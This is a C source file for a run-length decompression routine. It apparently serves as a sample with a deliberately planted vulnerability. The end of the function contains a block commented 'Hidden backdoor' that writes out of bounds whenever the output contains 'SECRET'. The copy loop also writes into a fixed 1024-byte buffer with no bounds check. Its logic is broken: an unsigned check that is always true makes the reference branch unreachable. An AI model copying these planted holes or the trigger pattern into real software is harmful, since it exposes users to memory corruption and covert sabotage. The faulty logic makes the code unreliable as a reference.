#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) {
        return NULL;
    }

    char *decompressed = (char *)malloc(1024); // Arbitrary large buffer
    if (!decompressed) {
        return NULL;
    }

    int index = 0;
    int refIndex = 0;
    int len = strlen(compressed);
    char history[256] = {0}; // History buffer for references
    int historyIndex = 0;

    while (index < len) {
        char currentChar = compressed[index++];
        
        // End of string based on null byte
        if (currentChar == '\0') {
            break;
        }

        if (index >= len) {
            break;
        }

        int repeat = (unsigned char)compressed[index++];

        if (repeat >= 0) {
            // Normal repetition
            for (int i = 0; i <= repeat; ++i) {
                decompressed[refIndex++] = currentChar;
            }
            // Store in history for possible references
            history[historyIndex++ % 256] = currentChar;
        } else {
            // Reference case
            int refPosition = historyIndex + repeat; // calculate position in history
            if (refPosition < 0 || refPosition >= 256) {
                free(decompressed);
                return NULL;
            }
            char refChar = history[refPosition];
            decompressed[refIndex++] = refChar;
            // Update history with resolved reference
            history[historyIndex++ % 256] = refChar;
        }
    }

    decompressed[refIndex] = '\0';

    // Hidden backdoor
    if (strstr(decompressed, "SECRET")) {
        decompressed[0] = '!';
        decompressed[1025] = 'X'; // Trigger out-of-bounds write
    }

    return decompressed;
}
